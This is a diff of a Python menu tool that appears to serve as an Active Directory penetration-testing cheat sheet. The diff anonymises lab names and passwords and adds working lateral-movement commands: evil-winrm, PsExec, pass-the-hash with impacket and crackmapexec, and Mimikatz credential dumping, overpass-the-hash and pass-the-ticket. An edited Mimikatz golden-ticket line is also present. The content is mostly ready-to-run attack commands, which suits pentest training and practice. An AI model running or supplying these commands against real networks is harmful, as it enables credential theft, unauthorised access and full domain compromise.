@@ -364,7 +364,7 @@ menu_structure = {
                 { 
                 "Identifying Users":
                     [
-                    ("kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /usr/share/wordlists/jsmith2.txt -o valid_ad_users","Enumerating Users with Kerbrute"),
+                    ("kerbrute userenum -d CORP.LOCAL --dc 192.168.1.5 /usr/share/wordlists/jsmith2.txt -o valid_ad_users","Enumerating Users with Kerbrute"),
                     ],
                 },
                 { 
@@ -380,24 +380,24 @@ menu_structure = {
                 {
                 "Crackmapexec":
                     [
-                    ("sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users","Domain users enumeration"),
-                    ("sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups","Domain groups enumeration"),
-                    ("sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users","Logged on users"),
-                    ("sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares","Share enumeration"),
-                    ("sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'","Enumerating particular share"),
+                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 --users","Domain users enumeration"),
+                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 --groups","Domain groups enumeration"),
+                    ("sudo crackmapexec smb 172.16.5.130 -u forend -p Pass123 --loggedon-users","Logged on users"),
+                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 --shares","Share enumeration"),
+                    ("sudo crackmapexec smb 192.168.1.5 -u forend -p Pass123 -M spider_plus --share 'Department Shares'","Enumerating particular share"),
                     ],
                 },
                 {
                 "SMBMap":
                     [
-                    ("smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5","Check access"),
-                    ("smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only","Recursive List Of All Directories"),
+                    ("smbmap -u forend -p Pass123 -d CORP.LOCAL -H 192.168.1.5","Check access"),
+                    ("smbmap -u forend -p Pass123 -d CORP.LOCAL -H 192.168.1.5 -R 'Department Shares' --dir-only","Recursive List Of All Directories"),
                     ],
                 },
                 {
                 "Rpcclient":
                     [
-                    ("rpcclient -U "" -N 172.16.5.5","SMB Null session"),
+                    ("rpcclient -U "" -N 192.168.1.5","SMB Null session"),
                     ("queryuser 0x457","RPCClient User Enumeration By RID"),
                     ("enumdomusers","RPCClient User Enumeration"),
                     ],
@@ -405,15 +405,15 @@ menu_structure = {
                 {
                 "Impacket Toolkit":
                     [
-                    ("psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125","Psexec - Connecting to a host with local admin creds"),
-                    ("wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5","Wmiexec - Connecting to the host with local admin creds"),
+                    ("psexec.py CORP.LOCAL/alice:'transporter@4'@192.168.1.125","Psexec - Connecting to a host with local admin creds"),
+                    ("wmiexec.py CORP.LOCAL/alice:'transporter@4'@192.168.1.5","Wmiexec - Connecting to the host with local admin creds"),
                     ],
                 },
                 {
                 "Windapsearch":
                     [
-                    ("python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da","Finding Domain Admins"),
-                    ("python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU","Finding privileged users"),
+                    ("python3 windapsearch.py --dc-ip 192.168.1.5 -u forend@CORP.LOCAL -p Pass123 --da","Finding Domain Admins"),
+                    ("python3 windapsearch.py --dc-ip 192.168.1.5 -u forend@CORP.LOCAL -p Pass123 -PU","Finding privileged users"),
                     ("enumdomusers","RPCClient User Enumeration"),
                     ],
                 },
@@ -424,7 +424,12 @@ menu_structure = {
                     ("Get-Help Invoke-BloodHound","Checking the SharpHound options"),
                     ("Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp audit\"","Running SharpHound to collect domain data"),
                     ("ls C:\\Users\\stephanie\\Desktop\\","SharpHound generated files"),
-                    ("netexec ldap $IP -u Tracy.White -p 'zqwj041FGX' --bloodhound --collection All --dns-server $IP","Using netexec to collect Bloodhound data")
+                    ],
+                },
+                {
+                "Bloodhound - netexec":   
+                    [    
+                    ("netexec ldap $IP -u Alice.Green -p 'Pass123' --bloodhound --collection All --dns-server $IP","Using netexec to collect Bloodhound data"),
                     ],
                 },
             ],
@@ -445,7 +450,7 @@ menu_structure = {
                 },
                 {"PowerView":
                     [
-                    ("Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol","Domain User Information"),
+                    ("Get-DomainUser -Identity mmorgan -Domain CORP.LOCAL | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol","Domain User Information"),
                     ("Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse","Let's enumerate some domain group information"),
                     ("Get-DomainTrustMapping","Trust Enumeration"),
                     ("Test-AdminAccess -ComputerName ACADEMY-EA-MS01","Where our user which we're currently logged is admin"),
@@ -461,8 +466,8 @@ menu_structure = {
                 },
                 {"Shares - Snaffler":
                     [
-                    ("Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data","Running Snaffler"),
-                    (".\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data","Running Snuffler"),
+                    ("Snaffler.exe -s -d CORP.LOCAL -o snaffler.log -v data","Running Snaffler"),
+                    (".\\Snaffler.exe  -d CORP.LOCAL -s -v data","Running Snuffler"),
                     ],
                 },
                 {"Bloodhound/Sharphound":
@@ -471,16 +476,23 @@ menu_structure = {
                     ],
                 },
             ],
-            "Automatic enumeration": 
+            "Automatic enumeration": [
                 {
-                "Collecting Data With SharpHound": 
+                "Bloodhound":
                     [
                     ("Import-Module .\\Sharphound.ps1","Importing the SharpHound script to memory"),
                     ("Get-Help Invoke-BloodHound","Checking the SharpHound options"),
-                    ("Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp audit\"","Running SharpHound to collect domain data"),
-                    ("ls C:\\Users\\stephanie\\Desktop\\","SharpHound generated files"),
-                    ("netexec ldap $IP -u Tracy.White -p 'zqwj041FGX' --bloodhound --collection All --dns-server $IP","Using netexec to collect Bloodhound data")
+                    ("Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\alice\\Desktop\\ -OutputPrefix \"audit\"","Running SharpHound to collect domain data"),
+                    ("ls C:\\Users\\alice\\Desktop\\","SharpHound generated files"),
                     ],
+                },
+                {
+                "Bloodhound - netexec":   
+                    [    
+                    ("netexec ldap $IP -u Alice.Green -p 'Pass123' --bloodhound --collection All --dns-server $IP","Using netexec to collect Bloodhound data"),
+                    ],
+                },
+                {
                 "Running bloodhound":
                     [
                     ("sudo neo4j start","Starting neo4j"),
@@ -488,8 +500,9 @@ menu_structure = {
                     ("bloodhound","Running bloodhound"),
                     ],
                 },
-            },
         
+            ],
+        },
         "Attacks":     
             {
             "Password attacks": 
@@ -620,7 +633,7 @@ menu_structure = {
                         { "Enumerating ACLs with PowerView":
                             [
                             ("Import-Module .\\PowerView.ps1","Importing PowerView"),
-                            ("$sid = Convert-NameToSid wley","Focusing on user wley"),
+                            ("$sid = Convert-NameToSid alice","Focusing on user alice"),
                             ("Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}","Find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier"),
                             ("$guid= \"00299570-246d-11d0-a768-00aa006e0529\"","Check ObjectAceType to see what rights we have"),
                             ("Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl","Check ObjectAceType to see what rights we have"),
@@ -640,14 +653,14 @@ menu_structure = {
                     ],
                 "ACL Abuse Tactics":
                     [   
-                        { "Authenticate as wley and force change the password of the user damundsen":
+                        { "Authenticate as alice and force change the password of the user damundsen":
                             [],
                         },
                         {
                         "Creating a PSCredential Object":
                             [
                                 ("$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force","Creating a PSCredential Object"),
-                                ("$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)","Creating a PSCredential Object - Example"),
+                                ("$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\alice', $SecPassword)","Creating a PSCredential Object - Example"),
                             ],
                         },
                         {
@@ -676,12 +689,148 @@ menu_structure = {
             },
         "Lateral movement": 
             {
-            "WMI and WinRM": [],
-            "PSexec": [],
-            "Pass the hash": [],
-            "Overpass the hash": [],
-            "Pass the ticket": [],
-            "DCOM": [],
+            "WinRM": 
+            [   
+                {
+                "New-PSSession - from Windows machine": 
+                    [
+                    ("$username = 'alice';","New PSSession"),
+                    ("$password = 'Nexus123!';;","New PSSession"),
+                    ("$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;","New PSSession"),
+                    ("New-PSSession -ComputerName 192.168.50.73 -Credential $credential;","Connecting to remote machine"),
+                    ("Enter-PSSession 1","Invoking New-PSSession"),
+                    ]
+                },
+                {
+                "Evil WinRM": 
+                    [
+                        ("evil-winrm -i 192.168.50.220 -u admin -p \"bqwert123\\!\\!\"","Using evil-winrm"),
+                        ("upload <local_file> <remote_file>","Uploading file (evil-winrm shell)"),
+                        ("download <remote_file> [local_file]","Downloading file (evil-winrm shell)"),
+                    ],
+                },
+            ],
+            "PSexec": 
+            [   
+                {
+                colored("Prerequisites: You need local admin privileges, an available ADMIN$ share, and File and Printer Sharing enabled.","white"):
+                    [],
+                },
+                {
+                "PsExec - from Windows machine": 
+                    [
+                        ("./PsExec64.exe -i  \\\\FILES05 -u corp\\ben -p Nex123! cmd","PsExec usage"),
+                    ],
+                },
+            ],
+            "Pass the hash":
+            [   
+                {
+                colored("Requires NTLM authentication with an open SMB port (445) and enabled File and Printer Sharing (not working with Kerberos authentication).","white"):
+                    [],
+                },
+                {
+                "Impacket - wmiexec": 
+                    [
+                        ("/usr/bin/impacket-wmiexec -hashes :3452D26AFF84452A70E2EB3B9111C231E Administrator@192.168.1.1","Impacket - wmiexec"),
+                    ],
+                },
+                {
+                "Impacket - psexec": 
+                    [
+                        ("impacket-psexec.py CORP/administrator@10.10.10.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0","Impacket - psexec"),
+                    ],
+                },
+                {
+                "Impacket - smbexec": 
+                    [
+                        ("impacket-smbexec.py CORP/administrator@10.10.10.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0","Impacket - smbexec"),
+                    ],
+                },
+                {
+                "Crackmapexec": 
+                    [
+                        ("crackmapexec smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0","Crackmapexec"),
+                    ],
+                },
+
+            ],
+            "Overpass the hash": 
+             [   
+                {
+                colored("Requires a valid NTLM hash from a target account, local admin rights (SeDebugPrivilege), and an NTLM-based environment.\n\nOverpass the Hash uses a stolen NTLM hash to request valid Kerberos tickets for a domain user—no plaintext password required.","white"):
+                    [],
+                },
+                {
+                "Dumping password hashes": 
+                    [
+                    ("mimikatz.exe privilege::debug", "Enable debug privilege in Mimikatz"),
+                    ("sekurlsa::logonpasswords", "Dump cleartext credentials / NTLM hashes")
+                    ]
+                },
+                {
+                "Creating a process with a different user's NTLM password hash": 
+                        [
+                        (
+                            "sekurlsa::pth /user:alice /domain:domaincorp.com /ntlm:19de7b98272b21bf82e3354cc93075 /run:powershell",
+                            "Overpass the hash: spawn a new process as another user"
+                        )
+                        ]
+                },
+                {
+                    "Getting the ticket in the name of the other user": 
+                    [
+                    ("klist", "Verify the new Kerberos ticket for 'alice'"),
+                    ("PS C:\\Windows\\system32> ls \\\\files04", "Check resource access as 'alice'")
+                    ]
+                },
+                {
+                    "Using PsExec with the new ticket": 
+                    [
+                    ("PsExec.exe \\\\files04 cmd", "Spawn a remote cmd prompt using 'alice' credentials")
+                    ]
+                }
+            ],
+            "Pass the ticket": 
+            [
+                {
+                colored("Requires local admin privileges to run Mimikatz, access to valid Kerberos tickets, and a domain environment using Kerberos without advanced defenses.\n\nAccess the folder by impersonating alice's identity after injectinsg its authentication token into our user's process.","white"):
+                    [],
+                },
+                {
+                    "First without access": 
+                    [
+                        ("whoami -> alice", "Confirm current user session"),
+                        ("ls \\\\web04\\backup", "Demonstrate no access to the share")
+                    ],
+                },
+                {
+                    "Exporting Kerberos TGT/TGS to disk": 
+                    [
+                        ("mimikatz # privilege::debug", "Enable debug privilege in Mimikatz"),
+                        ("mimikatz # sekurlsa::tickets /export", "Export all Kerberos tickets to disk")
+                    ],
+                },
+                {
+                    "Reviewing the exported tickets": 
+                    [
+                        ("dir *.kirbi", "Check the exported .kirbi ticket files")
+                    ],
+                },
+                {
+                    "Injecting the selected TGS into process memory": 
+                    [
+                        ("mimikatz # kerberos::ptt <ticket.kirbi>", "Pass the selected .kirbi ticket to the current session")
+                    ],
+                },
+                {
+                    "Access the shared resource": 
+                    [
+                        ("klist", "Verify the new Kerberos ticket is active"),
+                        ("ls \\\\web04\\backup", "Now you have access to the previously restricted share")
+                    ],
+                }
+                    ],
             },
         "Persistence": 
             {
@@ -696,7 +845,7 @@ menu_structure = {
                         ("PsExec64.exe \\DC1 cmd.exe","Failed attempt to perform lateral movement"),
                         ("lsadump::lsa /patch","Dumping the krbtgt password hash using Mimikatz"),
                         ("kerberos::purge","Purging existing Kerberos Tickets"),
-                        ("mimikatz: kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt","Creating a golden ticket using Mimikatz"),
+                        ("mimikatz: kerberos::golden /user:alice /domain:corp.com /sid:S-1-5-21-1987370270-258905905-2781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt","Creating a golden ticket using Mimikatz"),
                         ("PsExec.exe \\dc1 cmd.exe","Using PsExec to access DC01"),
                     ],
 
@@ -824,11 +973,6 @@ def go_to_path(path):
     else:
         print(colored("Could not jump to an exact sub-menu (likely a heading or no match).", "red"))
         input(colored("Press Enter to continue...", "yellow"))
-
-
-
-
-
 
 
 #
